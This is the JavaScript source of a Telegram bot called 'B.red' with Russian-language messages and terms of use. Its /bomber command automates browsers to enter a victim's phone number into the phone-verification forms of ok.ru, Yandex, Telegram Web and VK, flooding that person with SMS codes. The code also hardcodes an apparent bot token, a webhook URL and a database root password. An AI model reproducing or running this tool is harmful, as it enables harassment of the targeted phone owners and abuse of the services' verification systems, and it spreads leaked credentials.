const mysql2 = require("mysql2")
const TelegramApi = require ('node-telegram-bot-api')
const token = '6545699115:AAFykYEBwpJnqAKoMR8mRTYQNIIGUGLGA88'
const bot = new TelegramApi(token, {
	dropPendingUpdates: true,
	webHook: {
		port: 3000,
		autoOpen: false
	}
})

bot.setWebHook(`https://892e-94-31-81-120.ngrok.io/bot${token}`)
bot.openWebHook()

const {Builder, By, Key} = require ("selenium-webdriver")
const sleep = (delay) => new Promise((resolve) => setTimeout(resolve, delay)) // Too lazy to write timeout
let limit = false // Limit (I suck as a coder).
// BOMBER SIDE 


async function bomber1(strFrCmd, chatId) {
	let number = ('+' + strFrCmd.split(' ')[1])
	let driver = new Builder().forBrowser("phantomjs").build();
		limit = true // Limit is on
		 driver.get("https://ok.ru/dk?st.cmd=anonymRegistrationEnterPhone")
		 driver.findElement(By.id("field_phone")).clear()
		 driver.findElement(By.id("field_phone")).sendKeys(number,Key.RETURN)
		 await sleep(5999)
		 driver.quit()
		 driver = new Builder().forBrowser("phantomjs").build();
		 driver.get("https://passport.yandex.ru/auth/reg?origin=kinopoisk&retpath=https%3A%2F%2Fsso.passport.yandex.ru%2Fpush%3Fretpath%3Dhttps%253A%252F%252Fwww.kinopoisk.ru%252F%253Futm_referrer%253Dwww.google.com%26uuid%3Dc0f2dad4-67f1-4edd-9550-5d7d2356753a")
		 await sleep(1000)
		 driver.findElement(By.id("passp-field-phone")).clear()
		 driver.findElement(By.id("passp-field-phone")).sendKeys(number,Key.RETURN)
		 await sleep(5999)
		 driver.quit()
		 driver = new Builder().forBrowser("phantomjs").build();
		 driver.get("https://web.telegram.org/a/")
		 await sleep(7000)
		 driver.findElement(By.className("Button default primary text")).click()
		 await sleep(3000)
		 driver.findElement(By.id("sign-in-phone-number")).clear()
		 driver.findElement(By.id("sign-in-phone-number")).sendKeys(number,Key.RETURN)
		 driver.findElement(By.id("sign-in-phone-number")).clear()
		 driver.findElement(By.id("sign-in-phone-number")).sendKeys(number,Key.RETURN)
		 await sleep(2000)
		 driver.findElement(By.className("ripple-container")).click()
		 await sleep(5999)
		 driver.quit()
		 driver = new Builder().forBrowser("phantomjs").build();
		 driver.get("https://id.vk.com/auth?app_id=51441269&response_type=silent_token&v=1.60.0&redirect_uri=https%3A%2F%2Fdzen.ru%2Fapi%2Fauth%2Fweb%2Flogin-vk%2Fhttps%253A%252F%252Fdzen.ru%253Fauth%253Dlogin%2526utm_referrer%253Dwww.google.com%2526clid%253D1400&uuid=lOOoND4lN_LVzLrw2GM0e")
		 await sleep(4000)
		 driver.findElement(By.className("vkuiInput__el")).clear()
		 driver.findElement(By.className("vkuiInput__el")).sendKeys(number,Key.RETURN)
		 driver.findElement(By.className("vkuiInput__el")).clear()
		 driver.findElement(By.className("vkuiInput__el")).sendKeys(number,Key.RETURN)
		 await sleep(5999)
		 driver.quit()
		 await sleep(10000)
		 limit = false // Limit is over	
	bot.sendMessage(chatId,"⚠️ БОМБАРДИРОВКА ОКОНЧЕНА ⚠️ \n   🔄 Вы можете использовать бомбер повторно 🔄")
	}

	// --------

// --------
const pool = mysql2.createPool({
	host: "127.0.0.1",
	user: "root",
	password: "0000",
	database: "ids_names"
}
).promise()

// MySQL
async function createNotes(id,username) {
	const result = await pool.query(`
	INSERT INTO ids_names_table (id,username)
	VALUE(?,?)
	`,[id,username])	
	console.log(result)
}

async function getIDSNAMES() {
	const result = await pool.query("SELECT * FROM IDS_NAMES_TABLE")
	console.log(result)
	return result 
}

async function getID(chatId,username) {
	const 	[result] = await pool.query(` SELECT * FROM ids_names_table WHERE id = ?`,[chatId])
	console.log(result.length)
	if (result.length <= 0) {
		console.log('yay')
		createNotes(chatId,username)
	} else {
		console.log('no')
	}
}

//
bot.setMyCommands([	
	{command: '/bomber', description: 'Для бомбера нужно 	ввести номер в формате 490000000000 (Это пример) + код'},
	{command: '/rules', description: 'Правила обязательны для внимательного ознакомления. Мы не несем ответственности за ваши действия в случае непрочтения наших правил.	'}
]) // A list of commands

bot.on('message', msg =>{
	const text = msg.text
const chatId = msg.chat.id
getID(chatId,msg.from.username)
if (text.split(' ')[0] === '/bomber' && text.split(' ')[1] && text.length << 7 && parseInt(text.split(' ')[1]) && limit === false) { //Basically a check for everything (You suck if you trynna bypass it)

 bomber1(text, chatId) // process itself (Yeah bro its 1 line only)

 bot.sendMessage(chatId,"💣 ЗАПУСК ЯДЕРКИ 💣")  //Bomber alert
 bot.sendAnimation(chatId,'https://tenor.com/en-GB/view/spiritus-bomb-spinning-gif-21999640') // That's bit too far

} else if (text.split(' ')[0] === '/start' || text.split(' ')[0] === '/rules' ) { // very important command 


	bot.sendMessage(chatId,`
	<b>Условия использования Telegram-бота "B.red"</b>

	<b>Общие положения</b>
	
	<i>Предмет регулирования</i>
	Предметом регулирования настоящих Условий является Telegram-бот "B.red" (далее - "Бот"), предназначенный для проведения пранков.
	
	<i>Сфера применения</i>
	Условия применяются к любому лицу, использующему Бот (далее - "Пользователь").
	
	<i>Согласие с Условиями</i>
	Использование Бота означает согласие Пользователя с Условиями.
	
	<b>Права и обязанности пользователей</b>
	
	<i>Права Пользователей</i>
	Пользователь имеет право использовать Бота в соответствии с его назначением и получать информацию о работе Бота.
	
	<i>Обязанности Пользователей</i>
	Пользователь обязан соблюдать настоящие Условия и не использовать Бот для проведения пранков, которые могут причинить вред другим лицам. 
	
	<b>Ответственность</b>
	
	<i>Ответственность Разработчика Бота</i>
	Разработчик Бота не несет ответственности за действия Пользователей, совершенные с использованием Бота, за исключением случаев, предусмотренных законодательством Германии.
	
	<i>Ответственность Пользователей</i>
	Пользователь несет ответственность за последствия своих действий, совершенных с использованием Бота.
	
	<b>Заключительные положения</b>
	
	<i>Изменение Условий</i>
	Разработчик Бота вправе изменять Условия без предварительного уведомления Пользователей.
	
	<i>Регулирование споров</i>
	Все споры, возникающие в связи с использованием Бота, разрешаются в соответствии с законодательством Германии.
	
	<b>Приложение</b>
	
	<i>Список запрещенных действий</i>
	К запрещенным действиям относятся:
	- отправка сообщений, содержащих угрозу или оскорбление;
	- отправка сообщений, содержащих рекламу или спам;
	- отправка сообщений, содержащих вредоносный код.
	
	`, { parse_mode: "HTML" });


 } else if (limit === true) {	bot.sendMessage(chatId,"⚠️ подожди ээээ ⚠️") // Message that informs that limit is currently on
} else {
 bot.sendMessage(chatId,"🚫 Соблюдайте формат 🚫")
}
}	
)  